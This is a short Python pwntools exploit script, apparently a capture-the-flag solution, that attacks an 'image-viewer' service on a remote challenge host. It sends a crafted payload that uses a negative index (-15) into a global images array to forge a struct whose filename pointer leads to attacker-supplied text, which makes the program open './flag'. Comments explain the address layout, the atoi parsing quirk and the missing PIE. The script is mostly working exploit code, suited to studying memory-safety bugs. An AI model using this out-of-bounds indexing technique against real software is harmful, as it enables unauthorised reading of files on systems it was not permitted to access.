from pwn import *

p = remote('plsdonthaq.me', 5003)
#p = process('./image-viewer')

p.sendlineafter("> ", "trivial")
#&(images[i].id) = i*8 + 0x0804c0e0 (base of images array)
#&(images[i].filename) = i*8 + 0x0804c0e0 + 0x4 (offset 4 from base of struct)
#buf is across 0x0804c060 to 0x0804c0e0
#index -15 is at address 0x0804c068
#so we want to specify id -15x (-15 terminated) and then pad 4 bytes
payload = b'-15x'
payload += b'xxxx'
#then we add the id again which gets read in by images[-15].id
payload += p32(-15, sign=True)
#at this point we have filled data until 0x0804c06c
#we will then add a pointer here to 0x0804c070
payload += p32(0x0804c070)
#we are now at 0x0804c070 which the above pointer points to so here we write the file to open
#the ./ makes the file look different, passing the check
#payload += b'./flat earth truth'
#flat earth truth revealed the flag is in /flag
payload += b'./flag'


p.sendlineafter("> ", payload)
p.interactive()

'''
since theres no PIE and buf/images is global (so in code segment) we can control access by manipulating indexing of images to refer to some data in our buffer.
since atoi() is used, it scans in a number and stops when a non-number is reached so we can keep our payload in the buffer and the number will still get interpreted.


'''